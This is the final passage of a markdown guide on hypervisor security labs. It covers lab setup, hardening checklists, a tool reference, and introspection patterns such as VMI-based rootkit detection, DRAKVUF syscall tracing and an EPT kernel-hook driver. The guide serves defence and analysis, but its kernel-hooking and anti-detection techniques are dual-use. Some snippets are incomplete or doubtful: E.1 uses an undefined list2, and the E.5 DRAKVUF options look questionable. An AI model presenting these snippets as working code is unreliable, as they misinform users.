guestOS = "vmkernel6"
# 3. Boot from ESXi 7.0/8.0 ISO
# 4. Inside the nested ESXi, you can run a VM (double-nested) but performance is poor

# Useful for: ESXiShell/vim-cmd enumeration labs, VIB packaging labs
```

### KVM Lab on Linux

```bash
# Install KVM + libvirt + virt-manager
sudo apt-get install qemu-kvm libvirt-daemon-system libvirt-clients \
    virt-manager bridge-utils

# Enable nested virtualization (Intel)
echo "options kvm-intel nested=1" | sudo tee /etc/modprobe.d/kvm-intel.conf
sudo modprobe -r kvm-intel && sudo modprobe kvm-intel
cat /sys/module/kvm_intel/parameters/nested    # Y = enabled

# Create a network bridge for VMs to share host LAN
sudo brctl addbr br0
sudo brctl addif br0 eth0
sudo ip addr flush dev eth0
sudo ip addr add 192.168.1.10/24 dev br0
sudo ip link set br0 up

# Define and start a VM
virt-install --name=win7lab \
  --os-variant=win7 \
  --vcpus=2 --ram=2048 \
  --disk path=/var/lib/libvirt/images/win7lab.qcow2,size=40,format=qcow2 \
  --cdrom=/path/to/win7.iso \
  --network bridge=br0 \
  --graphics spice
```

### QEMU with Debugging

```bash
# Build QEMU with debug symbols (lab)
git clone https://gitlab.com/qemu-project/qemu.git
cd qemu && git checkout v8.0.0
mkdir build && cd build
../configure --target-list=x86_64-softmmu --enable-debug --enable-debug-info \
  --extra-cflags='-O0 -g3'
make -j$(nproc) && sudo make install

# Launch QEMU with GDB stub
qemu-system-x86_64 \
  -m 2048 -hda disk.qcow2 \
  -S -gdb tcp::1234 \
  -monitor stdio

# Attach from another terminal
gdb -ex 'target remote :1234' ./build/qemu-system-x86_64
```

### Xen on Debian

```bash
# Install Xen hypervisor
sudo apt-get install xen-hypervisor-amd64 xen-tools xenstore-utils \
    bridge-utils

# Reboot into Xen (verify)
sudo xl info
# Should show: xen_version, xen_caps, xen_changeset

# Create a guest
sudo xen-create-image --hostname=guest1 --memory=1024 --vcpus=2 \
  --lvm=vg0 --bridge=xenbr0 --dist=bullseye --role=udev

# Start guest
sudo xl create /etc/xen/guest1.cfg
sudo xl console guest1
```

### Proxmox VE Single Node

```bash
# Install Proxmox VE on a Debian host
# Recommended: download Proxmox VE 8 ISO from https://www.proxmox.com/

# Post-install: configure networking, create first VM
qm create 100 --name testvm --memory 1024 --cores 2 \
    --net0 virtio,bridge=vmbr0
qm set 100 --scsi0 local-lvm:vm-100-disk-0,size=20G
qm set 100 --cdrom local:iso/debian-12.iso
qm start 100
```

---

## Appendix C: Defensive Checklist

### ESXi Hardening (CIS VMware ESXi Benchmark)

- [ ] Enable Lockdown Mode (Strict)
- [ ] Disable SSH (set to disabled, not stopped)
- [ ] Disable DCUI on production hosts (or restrict to specific users)
- [ ] Disable ESXi Shell after maintenance
- [ ] Disable MOB (`Config.HostAgent.plugins.solo.enableMob = false`)
- [ ] Stop OpenSLP (`/etc/init.d/slpd stop; chkconfig slpd off`)
- [ ] Restrict vmkernel management network to dedicated VLAN
- [ ] Require MFA on vCenter SSO
- [ ] Audit vSphere admin accounts monthly
- [ ] Enable vTPM and vSB on every VM that supports it
- [ ] Apply VMSA patches within 7 days of release for Critical/High
- [ ] Forward ESXi syslog to remote SIEM
- [ ] Test VM restore from backup monthly

### KVM/QEMU Hardening

- [ ] Run qemu-system as unprivileged user (libvirt does this by default)
- [ ] Apply QEMU seccomp filter (`-sandbox on,obsolete=deny,elevateprivileges=deny`)
- [ ] Use `-nodefaults` to disable unnecessary devices
- [ ] Disable SPICE/VNC password-less access
- [ ] Bind SPICE/VNC to 127.0.0.1 or use SSH tunnel
- [ ] Patch host kernel aggressively (vhost-* bugs are common)
- [ ] Enable IOMMU if doing PCI passthrough
- [ ] Restrict libvirt TCP (16509) to management network with SASL
- [ ] Enable apparmor or SELinux for libvirt

### Hyper-V Hardening

- [ ] Apply Hyper-V MSRC patches within 7 days for Critical
- [ ] Configure Live Migration to use Kerberos over dedicated VLAN
- [ ] Deploy Shielded VMs for high-value guests
- [ ] Stand up Host Guardian Service on a dedicated hardened DC
- [ ] Enable VBS (Virtualization-Based Security) on host
- [ ] Audit VMWP child processes (sign of escape)
- [ ] Restrict Hyper-V Manager (vmms.exe) access to Domain Admins

### Xen Hardening

- [ ] Migrate PV guests to PVH (PV-on-HVM hybrid) where possible
- [ ] Enable XSM-FLASK policy
- [ ] Apply XSA patches within 7 days for Critical
- [ ] Run Dom0 as a minimal hardened distribution (e.g., Qubes-style)
- [ ] Audit XenStore permissions
- [ ] Restrict xl/xe CLI to a specific group

### Proxmox VE Hardening

- [ ] Enable 2FA on root@pam
- [ ] Restrict pveproxy (8006) to management VLAN
- [ ] Isolate Corosync (UDP 5404/5405) on dedicated VLAN
- [ ] Avoid privileged/nesting LXC containers in production
- [ ] Audit SPICE/VNC port allocation
- [ ] Apply Proxmox security updates monthly
- [ ] Use signed Cloud-Init images

---

## Appendix D: Tool Quick Reference

```bash
# govc - VMware CLI
govc about -u user:pass@<vc>
govc vm.info -dc.* '*'
govc vm.power -on -vm <name>
govc snapshot.create -vm <name> <snap>

# virsh - libvirt CLI
virsh list --all
virsh dump <domain> /tmp/dump --memory-only
virsh snapshot-create-as <domain> <name>

# xl - Xen toolstack
xl list
xl create /etc/xen/<vm>.cfg
xl console <vm>
xl migrate <vm> <dest>

# Hyper-V PowerShell
Get-VM
Get-VHD -Path <path>
Save-VM -Name <vm>
Checkpoint-VM -VM <vm> -Name <snap>

# Proxmox VE
qm list
qm create <vmid> --memory 1024
qm monitor <vmid>
pct list

# QEMU with QMP
echo '{"execute":"qmp_capabilities"}' | nc -U /var/run/qemu-monitor
echo '{"execute":"query-status"}' | nc -U /var/run/qemu-monitor

# LibVMI (Python)
python3 -c "import libvmi; vmi = libvmi.VMI('vmname'); print(vmi.translate_ksym2v('init_task'))"

# DRAKVUF
drakvuf -r profile.json -d <vm> -e 'C:\\malware.exe'

# Volatility 3
vol -f dump.bin windows.pslist
vol -f dump.bin linux.pslist
```

---

---

## Appendix E: Advanced VMI Patterns

### E.1 Cross-VM Process List Verification

```python
# Use case: detect process list manipulation in a guest rootkit
# The guest kernel's PsActiveProcessHead is walked via EPROCESS->ActiveProcessLinks
# A rootkit can unlink a process from this list to hide it.
# But the PspCidTable (handle table) still references the process.
# Solution: walk both lists from outside the guest and compare.

import libvmi

vmi = libvmi.VMI("win10-guest", initcomplete=True)

# Method 1: Walk PsActiveProcessHead
psapi_head = vmi.translate_ksym2v("PsActiveProcessHead")
links_off = vmi.get_offset("win_eprocess_active_link")
pid_off = vmi.get_offset("win_eprocess_pid")
name_off = vmi.get_offset("win_eprocess_name")

list1 = set()
cur = vmi.read_addr_va(psapi_head, 0)
while True:
    cur = vmi.read_addr_va(cur, 0)
    pid = vmi.read_32_va(cur + pid_off - links_off, 0)
    name = vmi.read_str_va(cur + name_off - links_off, 0, 16)
    list1.add((pid, name))
    if cur == psapi_head:
        break

# Method 2: Walk PspCidTable (handle table)
pspcid = vmi.translate_ksym2v("PspCidTable")
# PspCidTable is a _HANDLE_TABLE, walk its lower-level tables
# (This requires understanding _HANDLE_TABLE_INTERNAL_LEVEL1/2)
# Reference: Volatility windows.pspcid plugin

# Compare: list1 - list2 = processes hidden from ActiveProcessHead
hidden = list2 - list1
for pid, name in hidden:
    print(f"[!] HIDDEN PID {pid}: {name}")
```

### E.2 DRAKVUF System Call Tracing

```bash
# Trace all syscalls from a specific process via DRAKVUF syscall hooks

# Build DRAKVUF with full syscall support
cd drakvuf
./autogen.sh
./configure --enable-syscalls
make -j$(nproc)

# Run with syscall tracer
drakvuf -r win10.json -d malware-vm \
        -e "C:\\sample.exe" \
        -o json \
        -D /var/log/drakvuf/ \
        -a syscalls \
        -a filetracer \
        -a regtracer \
        -a socketmon

# Filter for malicious indicators in the JSON output
jq 'select(.Plugin == "syscalls" and .EventName == "NtCreateFile" and
            .FileName | contains("\\AppData\\Local\\Temp\\"))' \
    /var/log/drakvuf/*.log

# Look for lsass access (credential theft)
jq 'select(.Plugin == "syscalls" and .EventName == "NtOpenProcess" and
            .ProcessName == "lsass.exe")' \
    /var/log/drakvuf/*.log

# Look for kernel module loading (rootkit installation)
jq 'select(.Plugin == "syscalls" and .EventName == "NtLoadDriver")' \
    /var/log/drakvuf/*.log
```

### E.3 LibVMI on KVM (not just Xen)

```bash
# LibVMI supports KVM via the KVMi patch (vmi-kvm).
# Standard KVM does not expose introspection; the KVMi patch adds a
# socket-based introspection channel.

# Install patched QEMU + KVM
git clone https://github.com/bitdefender/kvmi.git
cd kvmi && ./build.sh

# Launch QEMU with KVMi
qemu-system-x86_64 \
  -enable-kvm -m 2048 \
  -chardev socket,path=/tmp/introspect.sock,server,nowait,id=kvmi \
  -device kvmi-pci,guid=<guest-uuid>,chardev=kvmi \
  -hda disk.qcow2

# Use LibVMI to connect to the KVMi socket
python3 <<'EOF'
import libvmi
from libvmi.event import EventInit, EventFlags
vmi = libvmi.VMI(
    "kvmi-guest",
    initcomplete=True,
    mode="kvmi",
    kvmi_sock="/tmp/introspect.sock"
)
# ... introspection code ...
EOF
```

### E.4 Memory Diffing for Rootkit Detection

```python
# Capture two snapshots of guest kernel memory and diff them
# to detect kernel patching (rootkit behavior)

import libvmi
import hashlib

def snapshot_kernel(vmi, start_va, size, chunk=0x1000):
    snap = {}
    for off in range(0, size, chunk):
        try:
            data = vmi.read_va(start_va + off, 0, chunk)
            snap[off] = hashlib.sha256(data).hexdigest()
        except Exception:
            snap[off] = None
    return snap

vmi = libvmi.VMI("linux-guest")

# Snapshot 1: clean
nt_kernel_base = vmi.translate_ksym2v("_text")
snap1 = snapshot_kernel(vmi, nt_kernel_base, 0x100000)

# ... guest runs for a while, possibly with malware ...

# Snapshot 2: after malware
snap2 = snapshot_kernel(vmi, nt_kernel_base, 0x100000)

# Diff
for off in snap1:
    if snap1[off] != snap2[off] and snap1[off] is not None:
        print(f"[!] Modified page at kernel offset {hex(off)}")
        # This indicates either legitimate kernel activity (page sharing,
        # lazy initialization) or a rootkit inline hook.
```

### E.5 DRAKVUF Trap Absorption (Anti-Detection)

```bash
# A sophisticated malware sample can detect VMI via timing:
# - Single-step traps add ~1000 cycles per instruction
# - RDTSC returns suspiciously high values on trapped instructions

# DRAKVUF supports trap absorption to reduce timing footprint:
# 1. Use breakpoint hooks instead of single-step where possible
# 2. Hide RDTSC via VMCS TSC offset adjustment
# 3. Use EPT to hide hook pages

# Configure DRAKVUF with trap absorption
drakvuf -r win10.json -d vm \
        -e "C:\\paranoid.exe" \
        -o json \
        --trap-absorb \
        --tsc-stealth \
        --ept-shadows
```

### E.6 HyperPlatform EPT Hook Deployment

```c
// HyperPlatform kernel-mode driver (Windows)
// Deploys an EPT hook on a kernel function to monitor calls

#include <ntddk.h>
#include "HyperPlatform/HyperPlatform.h"

typedef NTSTATUS (*NtCreateFile_t)(
    PHANDLE FileHandle, ACCESS_MASK DesiredAccess, ...);

static NtCreateFile_t g_origNtCreateFile = NULL;
static PVOID64 g_hookPage = NULL;

NTSTATUS HookedNtCreateFile(...) {
    DbgPrint("[HyperPlatform] NtCreateFile called\n");
    return g_origNtCreateFile(...);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {
    UNREFERENCED_PARAMETER(reg);

    // 1. Initialize HyperPlatform (deploys thin hypervisor)
    NTSTATUS status = HyperPlatformStartup(drv);
    if (!NT_SUCCESS(status)) return status;

    // 2. Find nt!NtCreateFile
    UNICODE_STRING name = RTL_CONSTANT_STRING(L"NtCreateFile");
    PVOID target = MmGetSystemRoutineAddress(&name);
    g_origNtCreateFile = (NtCreateFile_t)target;

    // 3. Allocate a copy page with our hook
    g_hookPage = ExAllocatePoolWithTag(NonPagedPool, 0x1000, 'Hook');
    RtlCopyMemory(g_hookPage, (PVOID)((ULONG_PTR)target & ~0xFFF), 0x1000);

    // 4. Patch the copy page with jmp HookedNtCreateFile
    ULONG_PTR hookOffset = (ULONG_PTR)target & 0xFFF;
    ULONG_PTR* patch = (ULONG_PTR*)((ULONG_PTR)g_hookPage + hookOffset);
    // ... write JMP HookedNtCreateFile at patch ...

    // 5. Swap EPT entry for target page to point to hook page
    EptSwap((ULONG_PTR)target & ~0xFFF, g_hookPage);

    return STATUS_SUCCESS;
}
```

---

## References

- [VMware Security Advisories](https://www.vmware.com/security/advisories)
- [Xen Project Security Advisories](https://xenbits.xen.org/xsa/)
- [QEMU Security Advisories](https://www.qemu.org/contribute/security-process/)
- [Microsoft Security Response Center (Hyper-V)](https://msrc.microsoft.com/update-guide/)
- [CIS VMware ESXi Benchmark](https://www.cisecurity.org/benchmark/vmware)
- [NIST National Vulnerability Database](https://nvd.nist.gov/)
- [LibVMI Documentation](https://libvmi.com/)
- [DRAKVUF on GitHub](https://github.com/tklengyel/drakvuf)
- [HyperPlatform on GitHub](https://github.com/tandasat/HyperPlatform)
- [KVMi Patch (Bitdefender)](https://github.com/bitdefender/kvmi)
- [PANDA on GitHub](https://github.com/panda-re/panda)
- [DECAF on GitHub](https://github.com/sycurelab/DECAF)
- [MITRE ATT&CK T1068](https://attack.mitre.org/techniques/T1068/)
- [CISA ESXiArgs Advisory (2023)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a)

---

**End of payloads.md**
